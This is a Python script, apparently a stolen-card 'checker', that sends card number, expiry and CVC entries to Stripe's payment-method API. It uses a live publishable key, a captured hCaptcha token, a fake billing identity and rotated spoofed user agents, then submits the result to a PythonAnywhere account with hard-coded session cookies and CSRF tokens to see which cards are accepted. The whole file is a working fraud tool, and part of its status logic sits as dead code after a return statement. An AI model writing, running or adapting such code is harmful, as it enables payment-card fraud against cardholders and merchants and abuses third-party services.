import requests
import time
import user_agent
from user_agent import generate_user_agent
user_agent = generate_user_agent()
import requests
import pyfiglet
import os
import random

user_agent = random.choice(['Mozilla/5.0 (Linux; Android 12; M2101K6G Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]',
'Mozilla/5.0 (Linux; Android 12; M2101K6G Build/SKQ1.210908.001; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 NewsSapphire/23.7.401202602',
'Mozilla/5.0 (Linux; Android 12; M2101K6G Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/420.0.0.32.61;]',
'Mozilla/5.0 (Linux; Android 11; M2101K6G Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/330.0.0.12.116;]',
'Mozilla/5.0 (Linux; Android 11; M2101K6G Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/367.0.0.24.107;]',
'Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Safari/537.36 OPR/71.0.3718.67035',
'Mozilla/5.0 (Linux; Android 12; M2101K6G Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.73 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/294.0.0.12.118;]',
'Mozilla/5.0 (Linux; Android 12; M2101K6G Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 WpsMoffice/16.5.2/arm64-v8a/1344',
'Mozilla/5.0 (Linux; Android 11; Redmi note 10 Pro ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36'
])

def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	
	headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.38(0x1800262b) NetType/WIFI Language/zh_CN qcloudcdn-xinan Request-Source=4 Request-Channel=99',
}
	data = f'type=card&billing_details[name]=Karlee+Konopelski&billing_details[address][line1]=39+Little+Brooklyn+Rd&billing_details[address][line2]=35+Little+Brooklyn+Rd&billing_details[address][city]=Warwick&billing_details[address][postal_code]=10990&billing_details[address][country]=IQ&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=50745a08-0689-4098-9f8b-00a7b6032886744538&muid=861efbb1-6a13-47e8-b992-6608f0e0089b4f6d53&sid=d282eceb-649e-4d78-9511-b493559e1aaaa3f93a&pasted_fields=number&payment_user_agent=stripe.js%2F9c2a825626%3B+stripe-js-v3%2F9c2a825626%3B+split-card-element&referrer=https%3A%2F%2Fwww.pythonanywhere.com&time_on_page=66018&key=pk_live_ECdoUHKMCDhZOSh2bJLLfBGa&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiMlA1K1FJR3ZTMWlEaGI0TVR3dFZ0b0o1WkxseU1pVklkYlJLa0Vueit2dlZHd0JtYmNpNkJnQkczWXFUWjBoeHVUTnBVVUJFVmlkb1Z3QUJZaU9neHFLbWRJQVBpMnRZU2dSTjNKUzdML3puU0NkekEvTjQ3djc3RzBRdHVNVlhrU294T0ZpVm9QVXNDVGxjMzFlS1l5NnpLQlJlcnprYkdxM3ZGZmlvdVIrZFc4aXV1UlJKQkNxaDhXL3NGWWdScTBqVFdHcXlWT2RaM0N2WHloWHhkUDRWU3pBU2ZieCtpTXJnNEh0T1Z0d1ZFY2JLUWltYngyVE9wVnJNQWR1WFArRkwxME1UVkRXanRsY09wZ0REa205YUhLVG1GczF5RWVQa3p5bUFheG9zbXV6RHVKWjhjQlRCVlFrR2p4OVllQy9XNTJLZUloMlB5Mm9wRlRnOG1LV0pzQmRTTUw1WUdtdGExek93aThrL21KUFFzMVV6VG5oOGlmWlVuTnRyV1JwWlFjTlF4M3VEUWJGNnFyeXY2dXVUS283dmNKN0VSNWYwL0Jhc0twMUhTSmxrV0hpUDJPSVYrT0IzZU5QUW9kWFR3QVNmbHlhb2tDZ0xUMWJIVW1LVjJQSnBNWVFBZ1FFUUl5amZWSFNZc1NoSzgrMnVKUDVNdldDUTJsU2p1Qk9IZjl1bURNT3lxMEhzRUFpMVcyd1hzNUh2dS9KT2U5bGM4cXVrRXpxWEo4eThkb2Q2L2UrUkFUU3BOeWVPMUQrY2hlOEg1VWdZdGlySXZNempkbXNVcXNka0w2ejhybjkyT2ppMjVNZS9OUTFpU1FCT0IzMkViZkFDRHJ1ZUdpc01FYWVwVW9VODZrenJTSStQZ0NHWXdoYVFPcDJ2c05wZTJsc3czZmtrR2J4NCtBYjBHb0F3TkJRUXpNdnh3c0RXRTdTa0U4SXAvUzRadjhZaTdSTXcrQlhFZTNjM0VDejVsVHkwZnVQRVFxbnNMMGc1VlVUK0hKaWhBN1BrSEpjampEY1paSkdSbERrcXBhS1kvT0NzRW4wcWpuSS9hOTJlcUpuR3k0cUJta2ZMdlhHeFBZTy9CUnZIeXVPY1Urc1hpYW4vNmRTcXJZdGZPVEl2cUZxVnJ5TUdRZzhnTEFJQU9rL0hjOG9kdC9uZ054THJmUXZVV2syeDZ0UHl3djNSTW5wZW90OUNtVEtKS2NEazVKN0pwV2JmWk1kTElYRnlEUnFBS2NGUlpnR2pKY0k4K3V2R0g3TXBicFRyb2VvRWRsRHd1TVRGNWxPNVFzZ3l6T0wwWE1iMzNRQ3lSV1grQ2Q3MVVJSHIrb0lwdXMxcVBkRDg3cXJ0ck9EZXRCRUhHUHhXQUxFT3hRUWxaZGw3bk1lY1I0Z3B3bDV3SEFTamdGeUZGWlQxZldtQmtLZ0tyeVBhV3EyNlA5QUxNSUFqcnc4WGE1clhZR2pGWlJoM3d1VWhOcXpxcm9QbGY0OSs2L1BFaGM5OVFwdkZGVHYzSWFIcnRnOHI4WkRzSDJjNmtLS2ViM2MvcEJrTjcxdWU0WHcwYnVOTVJtUVZFZklBaE1MN0JHYVRwWUxLQ3AyYUhpc3FsQnphMjdyUWNKbTh1UnBwWWJOVGdaNkcrN3Z3b2l1SEFhWXJzY0plZ2N2V1pEeG13RldBNjVMWTd1SEV1MVRlRU9NZGMzNFoxajh0am1qblpIeVVEckgwcy9aZ3dPUURxWUNJZ3lVd0xhM2ZqWFFKb1F4U052a28zcFRmK2hiR01uVFFUd0dmQ25TMS9vRnpEY2JyTlNBRElZL3NaeXJNQmNtTVF4TG1Hd1VXa1pOWVVkcUpud1I3VERvcEJDRzdUdWJCcFY1NkE2UEFRc0ozblNhRDV0Z0R0M1ozeCtPRDNKVEY5bEpCOUpJd3k2Y3hRZnRJcUJxdkZyUVZqOTRlZENoMkdmeStlQUNia2xoNXlNeitOSVM0RnJIbTY4Tm1RVVlocGNUTmQzZDl0NmdTTzhaaHllUllRczJsNXlFeTVkYzBkaS9PVjdpSEIyaXdIQTlnaVQxSmt6TWdFc3NqN2JWaGJUTWQzTWxXaTRTMUg1eERuZ0N2V0E2MndhMjViZXhLQ2lNWEZBR2hYdkNkOTZQa24vdzRIOW96eCtTcm1wbitueStDRHNuOExIRTlNaVd1Nit4aTBRNG5BQmJDYmJ6TGg5ZW1JdFhTRXNWNmlJdDc3ZkxrRGF4QUhnSTN3RjZ4N0gvcTZDanYvcDVLdkNWSzlDajg4RTZjZVArOHZXLzFQVFBNQ2NqZGx5Ukhidng2SHM0d0dpVStOUUsvVUp0Q3BBVlVkOXFFUy9DYVduWnM4czExWjVmcFNSdCtybDBXSHVScFJzZmtnS2dJTFJTMGxPVlVZMkpNSlZDQksvZTAwNkZ6U3h5OXB4dWRueWdpSVNCQVBQWTBBWWtYR1BQSmtIQUJXTjNCUjJCbngrUGlmTEp2YjNFcnhCYURiM29BNVR6M0hPTXl2U1ZmWEJVTHRkZEtqY2ErSGlra1FDakE3WEFMUkY0VUdYeTl3RC9zVlJJeGtJQ1ZpSmVTNXI2ZTlzSERrY0FINFpRRUFueUYyNlZsc2k4eHpwdTlucGZMVGphdDBHU0tLQis4VHl5eXBac1VETjFuSktaaG5VaXNQT3RIUk9iTzE5V2U1dXBwdmt0UXZLT0hpNENDeDZNTDZpUWFrSEdja3Q4M3JTRHBtdS9TRGxIZEVaK3hhbGx1QmY4SGxNZFNkRWZSWWU1M2VJMlpTRllkeGhnbVg4Q0g4czNPbDJrODVqZGNkYWFpMnVNNHhBNUFUTnBNRGdET1ZMSkd3aXoxMzQ5Njc2aXpUZ01nRDdkUXU5VzhJTzJEbk4zYzg2dnJWTkYvQVFUZndpcEJrY3BtRTBQYyszb2w0cm5CRHpIb0pTY1pBSUlLNE10OUpaU0oyTHJvTXVjVThpMmFILzFmck1SSS9mSGp3MGhBdlY1ODdDc2VteS9FZXJDLzdSQTg2UFArTE9UbS9YaHh0bVlDblI4NHoxRHc0YWp3TERWZC9pL3Uwa3lVcjcrdXBibnMwdTNobGFyY2xHcDRwemkraG9MS1hzY2hobjB4Ymw4eEs2NThpM1d4QTArUFpWWFFXMkJXRzg5R1pJRkMzcm9WNzBkUWoyK0d0b1F0ZnhES0FvSmZyQklFSUZIQmcwTXBqa3ZENm5KSXlFMUZnZHJCT3FHc1Q0eWdRajNpaGF0dWhEZXZSUT09IiwiZXhwIjoxNzIyODk3MDQ0LCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiMjI5OTE2NjEiLCJwZCI6MCwiY2RhdGEiOiI4RmtXb1pYME1QSjVpTXZ5Qnk5c1RvWXF0ZXpZaVVEYTJYUy9INXg4akVzNlNVYjNjMUw1SHJncHJHWDhQN296YjB1ZFl2b2htS0d5Nk1vRjcrSFo3Y3VRSUxIdXc2djBRT1lwUDB5amNVQU1qNUxMcXVuM0VCUktDOGJGQTVDZExlMlpERjNZMHdYdU9jSkhWY09RSDdaTWo0WW5MUDZmQWJ5WEg4Y2VHd0Z4eHFsV3ZkdmZ4aFZiSFJvM0t2cXdleHhJRTlCRmNRTjB4bjFSIn0.oUhbBYV5zgEb0TORJv8XCiyNsP1-dkvNA39cgYCbHQw'

	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data);id = response.json()['id']
    
	cookies = {
    'cookie_warning_seen': 'True',
    '_ga': 'GA1.1.833940160.1725559671',
    'csrftoken': 'dti1gdLQVoZLcyyZy38BXNwADbP9qZDOT1ZaER2Gj8gzQ60k4m3e18zHgr4ehn7A',
    'sessionid': 'sm45j2xzf4dkqs83jnukku0o5lyd77v7',
    '__stripe_mid': 'f5bf3e37-ffac-4dbd-8514-4f5aa7a6d0dcdeea9d',
    '__stripe_sid': 'c75d7d25-614d-4c8e-9907-68059ccbd95189cd9c',
    '_ga_DHJF51F24N': 'GS1.1.1726433516.6.1.1726433857.0.0.0',
}
	headers = {
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://www.pythonanywhere.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.pythonanywhere.com/user/tigerkurdish/account/stripe_enter_card_data',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': user_agent,
    'X-CSRFToken': 'HLd012NciPdQNQboOlXNDqjwhERv1uYznjU9pG42GzuEroDJkESqHLmDUU6ASSsl',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}
	json_data = {
    'payment_method_id': id,
}
	response = requests.post(
    'https://www.pythonanywhere.com/user/tigerkurdish/account/stripe_save_payment_details',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
	msg = str(response.text)

	return (msg)

	if "nextPageURL" in msg:
		return 
	elif "Your card was declined" in msg:
		print(f'{n}|{mm}|{yy}|{cvc}'' ➜ ', '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌');time.sleep(10)